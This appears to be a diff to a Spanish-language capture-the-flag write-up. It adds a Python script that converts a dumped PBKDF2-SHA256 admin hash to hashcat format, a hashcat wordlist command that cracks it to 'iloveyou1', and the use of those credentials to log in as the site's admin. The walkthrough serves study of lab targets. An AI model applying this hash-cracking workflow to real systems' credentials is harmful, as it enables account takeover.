@@ -44,3 +44,38 @@ Y vemos las columnas username y password_hash vemos el contenido con `SELECT use
 
 Nos devuelve un usuario `admin` con un hash `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`
 
+Utilizaremos el siguiente script que nos lo pasa a base64
+
+```
+#!/usr/bin/env python3
+
+import base64
+import sys
+
+h = ''.join(sys.argv[1:])
+
+if h is None or len(str(h).strip()) == 0:
+    print('please provide the hash')
+    exit(1)
+
+taa = h.split(':')[:-1]
+start = len(':'.join(taa) + ':')
+
+iterations = h[start:].split('$')[0]
+salt = h[start:].split('$')[1]
+sha = h[start:].split('$')[2]
+
+salt_base64 = base64.b64encode(salt.encode()).decode() # base64
+
+hash_hex = sha
+hash_bytes = bytes.fromhex(hash_hex) # hex to ascii
+hash_base64 = base64.b64encode(hash_bytes).decode() # ascii to base64
+
+print(f'{taa[1]}:{iterations}:{salt_base64}:{hash_base64}')
+```
+
+El hash que nos devuelve a base 64 se lo pasamos a hashcat `hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt` y nos da como contraseña `iloveyou1`
+
+### 80
+Con estas credenciales podemos acceder al usuario admin de la pagina web usando `admin:iloveyou1`
+
